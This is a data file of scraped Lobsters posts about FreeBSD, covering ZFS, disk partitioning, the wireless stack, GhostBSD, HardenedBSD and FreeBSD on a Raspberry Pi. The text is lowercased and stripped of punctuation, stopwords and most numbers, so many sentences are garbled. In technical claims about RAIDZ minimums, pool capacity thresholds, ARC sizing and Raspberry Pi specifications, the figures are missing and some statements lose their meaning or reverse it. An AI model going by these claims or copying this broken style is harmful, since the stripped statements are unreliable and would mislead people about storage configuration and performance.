originally based bsd unix run parallel linux many year similar however samehere might want run freebsd linux kernel repos freebsd system ok get email linux pretty fragmented freebsd freebsd single source truth documentation package lead next pointit carefully crafted ecosystem walled garden good leadership ecosystem make sure thing get fragmented might upset bleeding edge folk freebsd maintainer strict get added strive cohesiveness showsgenerally freebsd performs better linux expect exponential difference many test shown freebsd performs better linux especially high cpu situationsthe documentation incredible one thing freebsd maintainer take pride documentation stuck many time documentation lead salvationfreebsd often one way something benefit disadvantage often one way thing according designersmaintainers make thing easier say stifle innovation however need software package time either use pkg install build port simple easythe port system awesome afraid compiling source linux different story freebsd need compile something source even whole system painless freebsd spend long time compiling unavoidable nearly many error weird event linuxwhy would use freebsd certain time want use freebsd developerif package available sometimes package available linux emulation great solution reasonable horizon situation freebsd may best choice net core developer instance probably top choiceif need dockerkubernetes according documentation docker broken able get basic container going everything seemed fine seem like docker good place freebsd freebsd user prefer use jail putting much effort docker using docker daily work may red flagit challenging set freebsd user counter saying worth work freebsd difficult frustrating set lot learn may spend lot time tinkering want get running quickly may get started freebsd want try freebsd would suggest downloading virtualbox creating virtual machine put freebsd easiest way try without drastic thing machineyou need download freebsd cpu get virtual machine image make thing little easier need choose release stable explain difference would recommend stable canread documentation installing freebsd thorough help rough spotschoose desktop environment linux user already know install freebsd greeted prompt install kind environment want guibookmark freebsd forum place get help share learned well way enjoying freebsd might find operating system want stick good companycurrent v releaseso freebsd two different version stable current exactly sound like stable version thoroughly tested freebsd contributor considered stable production use supported freebsd foundationcurrent bleeding edge version freebsd contains latest greatest stuff might work also debugging monitoring going mixed bag since option put current laptopmy laptop efi system dual boot window install refit make boot menu entry nothing terrible fun beginner warned use freebsd developer machine answer big question yes ton modern development freebsd advantage fast stable system get configured stay way get real work done come variety tool available assist development foremost freebsd built developmentif end trying freebsd let know love hear feedback using
23,Lobsters,freebsd,FreeBSD,Old School UNIX Disk Partitions,https://bsdimp.blogspot.com/2020/07/old-school-disk-partitioning.html,old school unix disk partition,oldschool disk partition drive evolution partition edition wonder abbreviation edition edition edition,oldschool disk partitionsunix started life many thing invent fly disk handling one item something take utterly granted today upon time area active innovation blog explore early day unix static partitioning compiled drivertypical drive era large difficult manage look good maybe storage evolution partitionsunix earliest day least two type data stored disk first type file system offered hierarchical name space second type swap unix swapping system earliest day multiplex job memory kernel would keep track block assigned processsince disk played two different role different allocation policy persistent storage keep thing simple first edition disk partitioned static way file system used part disk swap used restdec never produce partitioning standard though later used unix unixrelated product mean unix guy nothing draw failed produce standard unix left research editionthere almost nothing resembling partitioning edition kernel unix booted drum device using top block store rest disk reserved swapping process intoout core memory source refer drum block drumthe disk presented device node entire disk edition manual page rk refers entire disk single sequentiallyaddressed file block numbered like rf disk tape file addressing blockorientedwhich describes single file entire block store available edition enigmatic crp filesystem documented one drive wonder abbreviation filesystem usr also show one filesystem per disk drive little bigger floppy disk one filesystem per drive much limitation also note sector size word bytessince limited source time period hard say sure bulk surviving data though say last block reserved unix editionwith edition start see multiple file refer different section disk done new drive supported block exceeded limit time block per device also allows drive broken manageable chunk release different file dev directory named second drive connected would reference drive manual table mirror surviving code disk startlength allows basically two configuration drive split half split small root partition two others partition swap nt one swap space edition configured paramh defines defined device start length device use system would configure early boot side though defines one could nt easily binary patch swap put used part disk tricky get right since map systemyou think drive like case rf driver specified size drive different minor rk driver allowed one experiment different interleaf factor different minor number really drive decide interpret minor number nt unusual various magtape driver used minor number specify density whether rewind editionsthe edition continued evolution changed table number overlapping region need special care used also meant reinstall system hack table driver upgraded used month edition suspect problem nt common edition came site running edition number nt huge since kernel patchable adb front panel switch issue likely could mitigated enough rebuild folk running edition trailblazer definition could expected cope upgrade edition time edition came hundred thousand may explain remained constant edition release rp predefined table became diskstartlength swapping still handled using space partition end filesystem edition way configuring swap improved moving defines variable easily patched adb edition swap still nt need partitionwhat interesting edition introduced raw character device well block device used filesystemthe edition us table edition also introduces disk interface similar hardcoded partition using similar editionthe edition change layout nt mean dec introduced newer larger drive edition also allows larger partition disk address byte instead two driver support multiple drive partition fixed setup different layout device supported well different model example hp driver support drive twice large drive number different layout align size difference used many different drive possible h driver also added well swap drum devicethe problem world new controller appearing third party number disk connect started proliferate problem going get ahead bit edition begat begat series release starting amusingly enough last release time get system different type disk partitioning scheme increasingly difficult manage one special little snowflake depending kind drive attached table xp driver run line author know bad prefix table read pack per drive return part similar problem made palatable creating program diskpart displayed default disk partition specific drive type allowed one create partition table cut paste driver andor config file helped still compiled kernel rather disk pack introduced new wrinkle bad sector information replacement sector conventionally accessible h file system partition disk partition used file system user responsible making sure overlap bad sector information replacement sectorsprogress slow least case every driver table handtweaked drive driver supported ok far went industry shifted away controller disk combo choice standard interface drive host functionality drive became untenable situationwe explore got worse got better second part see different vendor innovated area ahead solution appeared tahoe system around time edited correct typo
24,Lobsters,freebsd,FreeBSD,I'm back into the grind of FreeBSD's wireless stack and 802.11ac,https://adrianchadd.blogspot.com/2020/07/im-back-into-grind-of-freebsds-wireless.html,back grind freebsd wireless stack,work ampdu amsdu deencapsulation uapsd support migrating option pervap state change locking issue encryption key programming next add channel entry regdomainxml add mumimo group notification block traffic transmitted node creation key update clean linuxy bit wrap,hi yes since posted yes since actively working freebsd wireless stack life well life started port nt expecting take year life changed quite lot since lot thing stopped fun star aligned fun thing right first ifrun ralink mediatek usb driver stuff made mediatek acquired contributor named ashish gupta showed freebsdwifi irc channel efnet start working support ifrun got point basic worked took ran enough land support turn couple suitable nics test well happened super happy ashish came along get working another nic ifrun todo list anyone welcome contribute ashish looking wide channel support right short longgi support would good need get tx aggregation working via firmware interface look like linux driver bit need nt need retransmission support firmware set descriptor correctly work next basic bit even people think nt know mumimo stream yet basic ap sta driver regulatory domain support however implement port find missing bit really need ampdu amsdu deencapsulation hardware ampdu amsdu deencapsulation hardwarefirmware pushing individual decrypted deencapsulated frame driver support native wifi ethernet encapsulation right support native wifi note support well try get going driver land added support handle decryption offload supplied ampduamsdu frame pnmic done firmwarehardware could get traffic however receive throughput plainly sucked last poked also added amsdu offload support would nt drop amsdu frame receive sequence number however turn mac amsdu ampdu receive ampdu reordering faithfully dropping amsdu frame receive sequence number tcp would see massive packet loss drop throughput huge way implementing feature requires buffering amsdu frame ampdu subframe reordering queue rather tossing reordering single frame modified receive reordering logic reorder queue mbufs instead mbufs patched thing allow queuing multiple mbufs long appropriately stamped amsdus single ampdu subframe receive traffic rate udptcp phew uapsd support nt want implement full uapsd support atheros driver requires lot driver work get right actual uapsd negotiation support significantly easier nic support uapsd offload like populate wme qos field appropriately call driver notify uapsd change right nt support addts delts method client requesting explicit qos requirement migrating option pervap state bunch state still global rather pervap make sense old world nics thing driver side driven software firmware thing like current channel shortlong preamble etc global state however later nics offload various thing firmware begin interesting thing like background channel switching scan background channel switching sta lot state kept pervap rather globally right flag y set given vap started migrating state pervap field rather global showed second shortcoming global nt explicitly tracking thing perchannel ok need bit explanation say channel need determine whether care client seeing servicing client using short slot time short preamble require rtscts protection interoperate client client show client nt need interoperate nt need rtscts use short preamble short slot time still client need interoperate need switch protection mode legacy rtscts protection client show point protection kick everyone rtscts protection long preambleslot time kick property vap channel technically speaking property channel vap channel see client vaps need transition update protection mode migrated pervap kept global state literally driver currently consume driver us pervap state greatly simplifying thing finishing todo item driver change yes hacking locking issue bunch feedback pull request bjorn geramy pointing lock ordering deadlock issue slowly working straight conversion linux freebsd showed difference locking howwhen driver thread run rant another day encryption key programming encryption key programming programmed using firmware call currently expects done synchronously ca nt sleep crypto key update without changing lock sx lock honestly think bad solution paper nonasynchronous code honestly made asynchronous anyway node update done using deferred call required take complete copy encryption key content turn pretty quickly recycle key content including key hiding inside fixed key reprogramming deletion sometimes sending garbage firmware whoop next next well want land driver still whole bunch thing driver add channel entry regdomainxml yes added fcc nt add regulatory domain code lot work file implemented love help add mumimo group notification like make sure least support associating mumimo ap think firmware need support ie notification block traffic transmitted node creation key update right transmit frame right adding node sending key update assumes driver completing returning software driven nics like atheros chip hold true everything usb newer firmware based device definitely nt hold particular try transmitting frame without node firmware whole transmit path hang whoop fixed ca nt queue frame firmware nt know node send association response hostap mode node created mean first association response nt make associating client since nt yet traffic buffering buffer frame key update node additiondeletion make sure nothing sent dropped clean linuxy bit bunch dead code nt need nt use well compatibility bit define linux bit live going turn method remove linuxy bit bjorn work make linuxkpi wifi shim translate call api bit add rather roll full wifi method inside linuxkpi wrap job change relationship change kid getting green card buying house paying old debt old hosting company throw spanner life machine plus side hacking freebsd wifi support fun actually able sleep night go
25,Lobsters,freebsd,FreeBSD,Utility to determine if ELF binary is built with debug sections,https://github.com/sbz/elfdbg,utility determine elf binary built debug section,elfdbg debug section elf elf usage build install test kyua kyuafile history,elfdbg project elfdbg utility program quickly identify elf binary built debug section debug section elf binary usually generated using g flag compiler compiler add new debug section binary program looking existence section name starting debug determine binary built debug information elf format wellknown standard elf ti reference specification available freebsd elf man page usage intented used shell script order avoid using file parsing output like file pathtobinary awk debuginfo print elf determine binary built debug use following elfdbg q pathtobinary echo symbol else echo binary debug symbol fi freebsd easily identify binary package missing debug using similar oneliner pkg info lgrep localbinwhile read echo elfdbg done build install makefile use standard bsd makefile build program make sudo make install linux use make f gnumakefile specify gnu makefile test test case implemented using freebsd test suite framework kyua kyuafile make test history wrote using libelf elf gelf api rewrote without relying libelf api
26,Lobsters,freebsd,FreeBSD,Bringing ZFS Pool Checkpoints to FreeBSD Bootloader,https://oshogbo.vexillium.org/blog/79/,bringing zfs pool checkpoint freebsd bootloader,checkpoint zfs vermaden,almost two year ago wrote blog post checkpoint zfs hide big fan said two year still feel underappreciated feature zfs world decided something currently one best practice upgrading operating system use boot environment great feature managing multiple kernel userlands based juggling zfs datasets mounted dataset version system unfortunately boot environment limitation example upgrade zfs pool may able use older version system anymore big advantage boot environment good tool two main tool beadm created vermaden bectl currently freebsd base system tool allow u create manage boot environment boot environment also easily managed bootloader boot choose boot environment want use another way upgrading box use zfs snapshot case snapshot datasets system something go wrong roll back previous version use upgrading database among task upgrade create snapshot sqls change scheme something go wrong simply rollback state datasets technique handy also subtle nuance example add datasets remove upgrade pool upgrade process none operation rollbacked zpool checkpoint interesting based dataset whole pool thanks rollback pool upgrade dataset creation deletion ability handy complicated upgrading process zpool checkpoint remembers whole transaction group txg mean data disappear long checkpoint exists another caveat rewind checkpoint pool imported mean root zfs able rewind system booted also unable rewind singleuser mode pool already imported could boot separate file system rewind better friendly reminder rewind checkpoint lose data careful see zfs give u lot option securely upgrade operating system boot environment snapshot checkpoint great feature need tool help u use otherwise great feature hope support freebsd bootloader user use checkpoint guess time upgrade
28,Lobsters,freebsd,FreeBSD,HardenedBSD August 2020 Status Report and Call for Donations,https://hardenedbsd.org/article/shawn-webb/2020-08-15/hardenedbsd-august-2020-status-report-and-call-donations,hardenedbsd august status report call donation,,last month largely quiet one restarted work porting fiveyearold work code pointer integrity cpi project hardenedbsd chiefly started forwardporting libc rtld bit cpi project need look llvm compilerlinker enhancement need able apply safestack shared object application binary forwardporting work support effort infrastructure settled churning normally happily still working bandwidth issue hope new fiber line ran end september part status report issuing formal call donation aiming usd newer selfhosted gitea server hope purchase new server end last year migrated u away github sourceoftruth hardenedbsd source code port tree server hosting source rather ancient one dell insufficient cpu ram formally calling donation go towards newer server host code wanted selfhost source couple reason single sourceoftruth control monitor guarantee security provide unique access hardenedbsd ecosystem provide tor onion service need plan deploy mixnets anonymization service privacyrelated tech reaching hardenedbsd infrastructure unique way use gitea code sharing platform similar look feel github provides bug reporting wiki pull request feature given hardenedbsd downstream freebsd share history greater twenty five year place huge burden gitea hard time handmedown dell system desperately need upgrade appreciate every type contribution whether financial code documentation advocacy otherwise hardenedbsd would exist without continued help support community
29,Lobsters,freebsd,FreeBSD,PostgreSQL on FreeBSD advancements,https://www.youtube.com/watch?v=fdbO5Jpopbg&list=PLeF8ZihVdpFedccMdpBtBxniM3Lm-fVpT,postgresql freebsd advancement,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature postgresql freebsd thomas munro youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature postgresql freebsd thomas munro youtube
30,Lobsters,freebsd,FreeBSD,GhostBSD 20.08.04 Available,https://ghostbsd.org/20.08.04_release_announcement,ghostbsd available,upgrade done already download http wwwghostbsdorgdownload,happy announce availability ghostbsd release come kernel o software application update updated mate desktop new interesting feature boot environment backup update upgrade done already uname u output pkg update fsudo pkg upgrade fnote package upgrade pkg update station datewhere download image checksum hybrid iso dvd usb torrent available http wwwghostbsdorgdownload writing iso usb stick bsd dd linux dd ofdevsdc mac dd
31,Lobsters,freebsd,FreeBSD,FreeBSD Virtual Data Centre with Potluck – DevOps and Infrastructure as Code,https://honeyguide.eu/posts/virtual-dc1/,freebsd virtual data centre potluck devops infrastructure code,content introduction yes freebsd lack kubernetes really usage potluck potluck imagesflavours open ticket pull request github page architecture component freebsd package called minipot existing system used step installing pot installing pot step optional storage configuration network storage setup using minio minio setup guide mount bucket compute node via etcfstab,content article split three part introduction yes freebsd lack kubernetes really one main complaint freebsd lack docker kubernetes turn seen inability use freebsd platform bleeding edge concept like micro service scaleout container orchestration sure linux ecosystem diverse broader selection toolstacks choose article show freebsd also contains complete selection tool required run virtual datacenter vdc application used alternative exist port package collection well eg addition minio distributed storage solution like ceph moosefs usage potluck one major building block use quickly setting environment also provisioning containerised service potluck imagesflavours beside showcasing power freebsd platform article series give idea concept potluck admittedly still early stage potential complex container image set different interdependent container image like nomad consul traefik freebsd package collection individual application storage step article enough get basic configuration vdc running depending network speed setting core configuration consul nomad traefik step potluck image take minute point advanced feature like highavailability configuration exposed imagesflavours yet plan clearly improve coming week month last least feel free open ticket pull request github page come across bug requirement architecture component vdc built following tool application please note testing pot nomad consul traefik one system freebsd package called minipot existing simply installed pkg install minipot minipot excellent yet simple demonstration basic setup article aim lay foundation setup somebody transform actual production environment system used assume least two physical virtual host configuration consulnomadtraefik server could run service different host well course least one nomad compute node client probably one node real life step installing pot installing pot simple run following command host pkg install pot echo bootloaderconf sysrc potenable yes pot init v mandatory needed want allow pot thus also nomad limit resource usage jail ensure setting enabled reboot host step optional storage configuration network storage note setting environment described chapter optional also run two example nomad job without network storage since example cluster one compute node anyway leave permanent mountin storage test purpose completely basic idea service orchestration distributing service across different host based capacity demand requirement container jail created compute node started destroyed stopped service require read potentially write access storage life beyond lifetime service host eg database file data file directory necessary mount outside storage container initialisation principle network file system like nfs used make sure share mounted place host potentially could selected run service setup using minio since scale storage good fit scale compute platform could follow minio setup guide create distributed storage cluster simply mount bucket compute node via etcfstab please note due bug able chmod directory actually readable nonroot user within jail eg nginx user example job therefore mount bucket appropriately lax umask permission like etcfstab entry need add node assuming otherwise followed two article set minio testbucket fuse rw netdev allowother late urlhttps usepathrequeststyle enablenoobjcache nocheckcertificate usexattr complementstat
32,Lobsters,freebsd,FreeBSD,Finding File Duplicates with fdupes(1) on FreeBSD,https://rubenerd.com/finding-file-duplicates-with-fdupes/,finding file duplicate fdupes freebsd,fdupes freebsd port pkgsrc dupeguru,today learned mitlicenced fdupes adrian lopez performs hashed byteforbyte file comparison present list duplicated file work well use big shoutout ehaupt maintaining freebsd port ef bonn university maintaining pkgsrc mac use excellent open source dupeguru gui application need find duplicate across terabyte data one freebsd microservers weekend wanted tool could easily run detached screen session fdupes fit bill like buff platypus took zfs snapshot dataset case thing went pearshaped needed roll back set autodelete duplicate target directory substitute pool dataset directory required zfs snapshot pooltank backup echo delete data fdupes r n directory want identify duplicate fdupes r directory dupeslog want prompt find fdupes r directory someone probably tell zfs deduping applicable case quick dirty job clean recursively rsync mess halfasleep use compression pool anyway could cleaned let
33,Lobsters,freebsd,FreeBSD,BSD Gaming is Improving – Proton on FreeBSD,https://www.youtube.com/watch?v=wfvbyWGkRW0,bsd gaming improving proton freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature bsd gaming improving proton freebsd youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature bsd gaming improving proton freebsd youtube
34,Lobsters,freebsd,FreeBSD,Introduction to ZFS – Place to Start,https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/,introduction zfs place start,openzfs zfs filesystem logical volume manager copyonwrite cow filesystem snapshot logical block address use cmr zfs smr fragmentation primer zfs pool design vdev pool mirror degraded single raidz parity unraid raidz raid resilver drive parity add however slower performance end need speed iop throughput full pool slower ultimately get half second borrow zfs community western digital announced samsung evo plus block sector allocation unit size record size block running database server sector ashift ssds story muddies arc arc lru reddit post relatively slow old wisdom ram zil slog transaction group txg sync write zil zfs intent log twice write amplification slog worth noting zil zfs write cache final word building lab part planning truenas vmware esxi,truenas homepage zfs become increasingly popular recent year zfs linux zol pushed envelope exposed many newcomer zfs fold ixsystems adopted newer codebase called openzfs codebase truenas core purpose article help heard zfs yet opportunity research hope leave better understanding work way knowledge key decisionmaking process feel zfs something worth considering organization zfs zfs filesystem unlike file system also logical volume manager lvm mean zfs directly control bit block file stored hard drive also control hard drive logically arranged purpose raid redundancy zfs also classified copyonwrite cow filesystem mean zfs cool thing like snapshot normal filesystem like ntfs could snapshot thought like sound photograph something point time cow filesystem work however important implication need discus open zfs logo hard drive work piece data stored logical block address lbas zfs aware lbas specific file stored let u say need write file big enough fit block going store file lba considered sequential write block stored directly next spinning hard drive ideal write head move track wd red pro na top use cmr zfs smr let u say make change file part stored lba need modified write change zfs overwrite part file stored instead write block lba lba kept asis snapshot keeping expires allows u current version file previous one storing difference however next time go read file back read head spinning hard drive need read lba go track lba stored read go back track lba stored phenomenon called fragmentation primer zfs pool design make zfs pool easier understand going focus using small storage container may around house shop continue worth defining term vdev virtual device logical grouping one storage device pool logically defined group built vdevs zfs customizable therefore many different type configuration vdevs think construction zfs pool visualizing following graphic nested storage container starting smallest container size drive see visualization two drive larger container two larger container vdevs single largest container pool configuration would pair drive mirror mean one drive fail either vdev pool would continue function degraded state two mirror vdev one bad drive however drive single vdev data entire pool lost redundancy pool redundancy zfs vdev layer one vdev fails enough information rebuild missing data two mirror one vdev drive failed next need define raidz various level raidz raidz way putting multiple drive together vdev storing parity fault tolerance zfs dedicated parity drive like unraid instead store parity across drive vdev amount parity spread across drive determines level raidz way similar traditional hardware raid make raidz better approach mirrored configuration matter drive fails raidz drive equal partner whereas mirrored configuration mirrored vdev separate entity benefit raidz come cost performance however mirrored pool almost always faster raid z raidz similar traditional raid raidz one drive worth parity word lose one drive pool continue function raidz need minimum drive per vdev even drive raidz vdev drive add however longer take resilver rebuild increased time increase risk data second drive failure process would destroy pool zfs resilver data still use live recovery implication disk working harder usual process increase chance second drive failure data still accessible production reading parity data existing member vdev writing new disk pool single raidz vdev vdev akin raid configuration drive worth parity stored across device lose two drive per vdev pool still function adding parity drive increase calculation required mean need processing performance operate array pool single raid vdev finally vdev provides three drive worth parity lose three drive per vdev pool still function drive parity add however slower performance end need minimum four use least five drive build vdev need speed two way measure speed fastness iop throughput raidz drive give throughput actual read write speed see transferring file however ever tried run multiple file copy window simultaneously may noticed slower get always get slower constant rate try disk get exponentially slower disk many inputoutput operation per second iop raidz scale throughput disk add scale iop generally mean raidz traditionally best choice io intensive workload amount iop roughly limited slowest member vdev exclude caching zfs virtualization discussing highly dependent io earlier discussed zfs cow filesystem suffers data fragmentation direct performance implication stem fact full pool slower ultimately get write speed zfs directly tied amount adjacent free block write pool fill data fragment fewer fewer block directly adjacent one another single large file may span block scattered surface hard drive even though would expect file sequential write longer drive full seagate mobile hdd crystal disk mark performance graphic see seagate mobile drive tested crystaldiskmark mb sequential read writes also see start random io speed fall meant illustrate performance impact data fragmentation additionally see latency lookup take half second limited iop order fast virtualization workload traditional hard drive need many disk order compensate slowness would uncommon see pool constructed vdevs mirrored drive additionally wisdom borrow zfs community pool fill sequential writes become increasingly difficult accomplish due fragmentation slow nonlinear way general rule thumb capacity pool noticeably slower capacity capacity pool start become slow zfs actually change write algorithm ensure data integrity slowing ssds come radically change game work differently physical layer read write head flying around spinning disk back forth trying find data physical limitation diskbased drive way ssds read write nonsequential data much faster suffer penalty rule nearly severely fragmentation hurt performance degree samsung evo plus ssd hard drive increased capacity leapsandbounds past couple decade seen hard drive grow single gigabyte capacity last year western digital announced terabyte drive coming changed ability io hard drive old new alike still bound physical limitation even new monster really able random iop four time year ago samsung evo plus pictured however evo plus crystaldiskmark result review receive enough feedback another piece talk tuning performance zfs block sector finally need briefly explore additional topic underlying storage configuration window computer plug new hard drive flash drive need format assign drive letter use similarly finish creating pool zfs need create dataset order actually start using format flash drive window asks specify allocation unit size window formatting screen zfs term called record size value represents maximum size block block assembles piece data logical grouping truenas core define record size pool level child datasets inherit record size set pool also specify different record size create additionally modify record size point however affect new data written pool existing data truenas core creates datasets record size default meant wellrounded decision depending workflow may wish increase decrease value running database server example would make sense set value smaller number record size example would allow transaction database written directly disk rather waiting fill entire record default configuration general rule thumb smaller record size offer lower latency whereas larger one offer higher overall throughput physical representation hard drive photo courtesty uma recordsize span sector native hard drive sector lowestlevel piece storage puzzle closest thing physical embodiment data inside storage medium going go zfs need aware information order make intelligent decision read write data disk tell sector size providing ashift value truenas core pretty good job automatically modern disk sector size drive zfs need ashift value older drive would use ashift value ssds story muddies report o drive reality function internally drive device would require manually assign ashift value use unsure better high low small ashift value cripple performance arc zfs adaptive replacement cache arc algorithm cache file system memory type cache read cache direct impact write performance traditional file system lru least recently used cache used way cache work open file computer put file cache close reopen file load cache rather hard drive lru cache evict least recently used item cache first let u say file talking excel spreadsheet assume opened file got cache excel file something access frequently throughout workday make change close go work powerpoint write email lru cache potentially run space evict excel file cache open later day rather reading cache load disk cache usually much larger office document using conceptual example arc differs take recent eviction history account time file evicted arc occurrence logged algorithm give weight log file evicted cache lower priority evicted level arc extension zfs arc file evicted arc moved rather removed resides disk disk rather system memory since ram expensive feature useful way expand caching capability advent nvme optane relatively high speed large caching achieved come cost however since arc need know file stored store information ram according reddit post oracle employee formula calculating arc header mapping size byte zfs recordsize byte byte arc header size byte let u make sense purpose use truenas default block nvme ssd byte would pretty common configuration choice lowerend vm storage box ram system arc space would wasted mapping would entire rest system would want minimum ram would recommended nvme v software ram disk want keep data cached arc tiered approach comparison attempt illustrate fact even using software ramdisk driver pc relatively slow faster samsung old wisdom always ram ultimate goal prevent pool many read arc directly cache writes speed write performance freeing drive constantly read disk zil slog explain zil slog must first explain data written zfs pool write disk occurs must first pas system memory transaction group txg created zfs asynchronously commit data pool meaning check balance ensure data got pool successfully event crash power failure corruption occurred lost data written zfs also write data block synchronously force zfs setting syncalways flag pool addition sync write commits writes zil zfs intent log parallel system memory normal txg written pool successfully data zil erased system crash power interrupted data remain zil since system memory volatile zil considered insurance policy write commits speed writes however tied speed zil default zil life pool logically separate place ever read one scenario crash power failure every time system restarted reimport zfs pool proceeding pool reimported zfs look see remaining data written zil mean writes yet committed disk read data commit new txg pool mean sync write data written disk pool twice called write amplification slow write commits pool crawl sync writes high cost cutting write performance half intel optane dc cover slog come slog separate piece hardware act dedicated place zil live separate hardware prevents write amplification effect pool also allows put zil much faster device important writes still limited speed slog transaction especially sensitive disk latency important throughput iop slog device reason recommend intel optane use sync writes requirement intel optane dc performance latency zoom worth noting zil zfs write cache pool write speed always faster asynchronous writes even using slog using sync writes feel data sensitive enough require sync writes buy slog final word spent time article discussing key concept surrounding zfs hope helped provide provide necessary knowledge reference get started world zfs go build lab go bid new storage solution open source tremendous resource considered covered everything piece special allocation class openzfs feature allow accelerate metadata spinning drive flash storage additionally use get betterperforming deduplication still new feature openzfs yet tested vetted viability value additionally zfs onthefly compression native encryption support wholehost new feature actively developed hope follow introduction zfs piece content future around zfs new thing come want put action lab check series starting building lab part planning truenas vmware esxi
35,Lobsters,freebsd,FreeBSD,Call for Testing for Vendor OpenZFS 2.0 in FreeBSD,https://lists.freebsd.org/pipermail/freebsd-hackers/2020-July/056338.html,call testing vendor openzfs freebsd,cft vendor openzfs week reminder memdisk image mmacy freebsdorg http http http githubcommattmacynetworkinggit http githubcomzfsonfreebsdzofgit information freebsdhackers mailing list,cft vendor openzfs week reminder memdisk image matthew macy mmacy freebsdorg wed jul utc wednesday july issued initial call testing update head vendored openzfs like give user roughly month test merging tentative merge date august hope terribly controversial point really rest user non platform test avoid unpleasant surprise next time update tree following merge memdisk image found http using platform listed would inclined test image work let u know alternatively still build following instruction review merging base found http nb zpool upgrade unless willing live without ability ever rollback legacy zfs kmod checkout updated head git clone http githubcommattmacynetworkinggit b projectsopenzfsvendor freebsd checkout updated openzfs syscontrib git clone http githubcomzfsonfreebsdzofgit b projectsopenzfsvendor freebsdsyscontribopenzfs build world kernel whatever usual configuration possible openzfs kmod backward compatible cmd utils head common operation work existing tool new kmod projectsopenzfsvendor branch zof ozfs library backward compatible zfs kmod head although ideally one would test separate boot environment interoperability allow one rollback without much difficulty thanks advance time information freebsdhackers mailing list
36,Lobsters,freebsd,FreeBSD,Install and Configure FreeBSD on Raspberry Pi,https://cromwell-intl.com/open-source/samba-active-directory/freebsd-raspberry-pi.html,install configure freebsd raspberry pi,installing freebsd raspberry pi freebsd raspberry pi building active directory server samba running freebsd free server software free operating system set needed dns infrastructure jump back start install freebsd raspberry pi jump next step nt using freebsd raspbsdorg freebsdorg freebsdorg dd iffreebsd rpi img ofdevsd raspbsdorg df ht setting user account modifying radvd rfc ifconfig netstat r traceroute wwwgooglecom wwwgooglecom configuring syslog egrep v etcsyslogconf cat etcrsyslogdfqdnconf systemctl restart rsyslog configuring time zone tzsetup tzsetup americayellowknife mounting root file system posix acls kenv mount grep vartmp mount u noatime vartmp mount grep vartmp mount u noatime vartmp mount grep mount u noatime echo mount grep freebsd access control list building linux kernel root file system modified tool job sync sync sync mount f u ro dumpfs grep flag tunefs n disable tunefs enable dumpfs head tunefs p freebsd disk tuning adding samba bind pkg search bindnamedsamba package management bsd linux solaris bind dlz dns back end bind version supported starting pkg install next step slave dns server linux topic,installing freebsd raspberry pi freebsd raspberry pi building active directory server samba running freebsd free server software free operating system set needed dns infrastructure existing bind master primary dns server next step put together system make slave secondary dns server initial step building sambabased active directory server freebsd running raspberry pi must take extra step stage samba requirement file system security requirement posix access control list along admittedly uncommon combination operating system hardware mean modify file system jump back start overview project install freebsd raspberry pi jump next step nt using freebsd initially used raspberry pi model b project broadcom soc system chip includes mhz processor mb ram videocore iv gpu cpu performance like mhz pentium ii bear mind initial testing experimentation try run enterprise raspberry pi model b raspberry pi comparison cpu faster clock time cpu performance would get samba suite service running faster see later step something like samba process smbd process winbind process running simultaneously core would definitely help still nt run entire enterprise one raspberry pi cost u least get several set replication load balancing failover seriously probably nt want deploy raspberry pi b model usb port mbps ethernet port hdmi video audio output power something like smart phone charger ideally one provides current usual later moved project raspberry pi provides cpu core server process singlecore raspberry pi model b download freebsd image raspbsdorg freebsdorg also page freebsd raspberry pi freebsdorg although page seems updated much le frequently linux writing image bsd system one disk microsd card appear something like device inventory change either linux bsd look kernel ring buffer dmesg tail see appeared plug microsd card downloaded image uncompressed wrote onto memory card dd careful select correct device ran df first using lvm would run pvscan inventory disk holding data get listing device file devsd plug usb device sd memory card see added several disk system devsda sdf saw two new device sdg card ibm mbr partition table defining one partition spanning device vfat file system partition write image onto entire device careful choose correct target location change sdx appropriate following used sdg nt destroy data overwriting wrong device dd iffreebsd rpi img ofdevsdx connected ethernet cable power supply waited boot saw get ip address dhcp server connected ssh user raspberry password raspberry image raspbsdorg could run su become root without password resulting file system resizes root partition fill device first boot disk gb microsd card df ht filesystem type size used avail capacity mounted ufs devfs devfs dev msdosfs bootmsdos ufs tmp ufs varlog ufs vartmp setting user account created user account uidgid system copied vimrc cshrc ssh place also added wheel group modifying etcrcconf main linux system one interface interior network hostname router resolving address run radvd router advertisement daemon forward internet another interface connected cable modem advertises prefix internally per rfc freebsd etcrcconf file originally contained line along several others hostname raspberrypi dhcp ntpdenable yes syslogdenable replaced line following customize hostname networking original hostname raspberrypi hostname freebsd original dhcp inet defaultrouter routerexamplecom routerexamplecom original ntpdenable yes ntpdenable yes original syslogdenable syslogdenable yes restarted networking etcnetstart script found thing worked ifconfig loopback running multicast metric mtu rxcsum txcsum prefixlen prefixlen scopeid inet netmask group lo performnud autolinklocal broadcast running simplex multicast metric mtu rxcsum vlanmtu linkstate ether ae inet netmask broadcast ebff prefixlen scopeid ebff prefixlen medium ethernet autoselect fullduplex status active performnud autolinklocal netstat r routing table internet destination gateway flag netif expire default routerexamplecom ugs link u freebsdexamplecom link uhs localhost link uh destination gateway flag netif expire localhost ugrs default routerexamplecom ugs localhost link uh localhost ugrs link u ebff fe link uhs localhost ugrs link u link uhs link u ebff fe link uhs localhost ugrs traceroute wwwgooglecom routerexamplecom m m m m m m m m m m m m m m m m m m m m m several hop deleted m m m m m m wwwgooglecom routerexamplecom m m m m m m m m m m m m m m m m m m m m m several hop deleted m m m m m m configuring syslog edited etcsyslog commented line sending output file added one line end sending syslog output log collector result egrep v etcsyslogconf include etcsyslogd include usrlocaletcsyslogd syslogd daemon freebsd include hostname message message simply timestamp daemon pid message compare syslog daemon insert hostname timestamp hostname ip address message log collector insert ip address source log collector using rsyslog add new file get resolve name named anything long end conf cat etcrsyslogdfqdnconf preservefqdn systemctl restart rsyslog configuring time zone set time zone tzsetup time date reported utc local time defined many choice defined file usrsharezoneinfo something like tzsetup refer hierarchy file yukon could something like tzsetup americayellowknife also recall configured ntp daemon run kerberos requires time synchronization mounting root file system posix acls samba requires file system support posix accesscontrol list modified etcfstab addition highlighted yellow bootmsdos msdosfs rw noatime ufs rw noatime acls md tmp mf rw noatime acls md varlog mf rw noatime acls md vartmp mf rw noatime acls however mount command next boot showed root file system mounted incompatible option others requested acls option following line went varlogmessages reboot freebsd kernel warning acls flag f conflict acls mount option option ignored mysterious kenv showed kernel environment looked right kenv line autobootdelay bootfile 